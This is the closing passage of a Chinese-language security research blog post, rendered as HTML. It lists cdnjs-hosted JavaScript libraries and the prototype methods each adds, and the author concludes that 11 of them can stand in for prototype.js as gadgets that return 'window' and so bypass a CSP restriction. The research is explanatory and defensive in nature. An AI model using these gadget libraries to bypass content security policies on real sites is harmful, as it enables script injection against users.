+      <span class="token string">"Array.prototype.$to_a"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$to_ary"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$unshift"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$prepend"</span><span class="token punctuation">,</span>
+      <span class="token string">"String.prototype.$initialize"</span><span class="token punctuation">,</span>
+      <span class="token string">"String.prototype.$chomp"</span><span class="token punctuation">,</span>
+      <span class="token string">"String.prototype.$force_encoding"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.$to_proc"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/jquery-ui-bootstrap/0.5pre/third-party/jQuery-UI-Date-Range-Picker/js/date.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Number.prototype.milliseconds"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.millisecond"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.seconds"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.second"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.minutes"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.minute"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.hours"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.hour"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.days"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.day"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.weeks"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.week"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.months"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.month"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.years"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.year"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/ext-core/3.1.0/ext-core.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Function.prototype.createInterceptor"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/datejs/1.0/date.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Number.prototype.milliseconds"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.millisecond"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.seconds"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.second"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.minutes"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.minute"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.hours"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.hour"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.days"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.day"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.weeks"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.week"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.months"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.month"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.years"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.year"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/json-forms/1.6.3/js/brutusin-json-forms.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"String.prototype.format"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/inheritance-js/0.4.12/inheritance.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Object.prototype.mix"</span><span class="token punctuation">,</span>
+      <span class="token string">"Object.prototype.mixDeep"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/melonjs/1.0.1/melonjs.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Array.prototype.remove"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core-compat.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Array.prototype.erase"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.empty"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.extend"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.implement"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.hide"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.protect"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Array.prototype.erase"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.empty"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.extend"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.implement"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.hide"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.protect"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/opal/0.3.43/opal.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Array.prototype.$extend"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$to_proc"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$to_a"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$collect!"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$delete_if"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$each_index"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$fill"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$insert"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$keep_if"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$map!"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$push"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$shuffle"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$to_ary"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$unshift"</span><span class="token punctuation">,</span>
+      <span class="token string">"String.prototype.$as_json"</span><span class="token punctuation">,</span>
+      <span class="token string">"String.prototype.$extend"</span><span class="token punctuation">,</span>
+      <span class="token string">"String.prototype.$intern"</span><span class="token punctuation">,</span>
+      <span class="token string">"String.prototype.$to_sym"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.$as_json"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.$extend"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.$to_proc"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.$downto"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.$nonzero?"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.$ord"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.$times"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.$include"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.$module_function"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.$extend"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.$to_proc"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Array.prototype.clear"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.times"</span><span class="token punctuation">,</span>
+      <span class="token string">"Function.prototype.curry"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/tmlib.js/0.5.2/tmlib.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Array.prototype.swap"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.eraseAll"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.eraseIf"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.eraseIfAll"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.clear"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.shuffle"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.times"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.upto"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.downto"</span><span class="token punctuation">,</span>
+      <span class="token string">"Number.prototype.step"</span><span class="token punctuation">,</span>
+      <span class="token string">"Object.prototype.$extend"</span><span class="token punctuation">,</span>
+      <span class="token string">"Object.prototype.$safe"</span><span class="token punctuation">,</span>
+      <span class="token string">"Object.prototype.$strict"</span>
+    <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>扣掉開頭講的 prototype.js，我們還有其他 11 個套件可以搭配使用，讓我們繞過限制，順利拿到 <code>window</code>。</p>
+<h2><span id="總結">總結</span></h2><p>透過把 cdnjs 上的套件資料都抓下來，以及使用 headless browser 幫忙驗證，我們成功找到了 11 個 prototype.js 的替代品，這些套件都會在 prototype 上面新增方法，而且呼叫這些方法以後都會回傳 <code>this</code>，可以藉由呼叫它來取得 <code>window</code>。</p>
+<p>從開始執行到產出結果，大概花了一兩天而已，因為資料格式相對單純，驗證方式也很單純，數量也沒有說真的很多，想加速的話也可以多開幾個 thread 來跑。</p>
+<p>另外，找出替代品其實也沒什麼太大的意義，只是好奇而已，因為通常也不會有網頁特別去擋 <code>prototype.js</code>，所以其實只要找到一個可以拿到 <code>window</code> 的套件就足夠了。</p>
+<p>但總之這個研究的過程還是滿好玩的。</p>
+<p>完整程式碼：<a target="_blank" rel="noopener" href="https://github.com/aszx87410/cdnjs-prototype-pollution">https://github.com/aszx87410/cdnjs-prototype-pollution</a></p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2022/09/29/css-injection-1/">用 CSS 來偷資料 - CSS injection（上）</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2022/08/01/uiuctf-2022-writeup/">UIUCTF 2022 筆記</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">評論</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>繁體中文</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2022/09/01/en/angularjs-csp-bypass-cdnjs/" class="dropdown-item">
+                    English
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
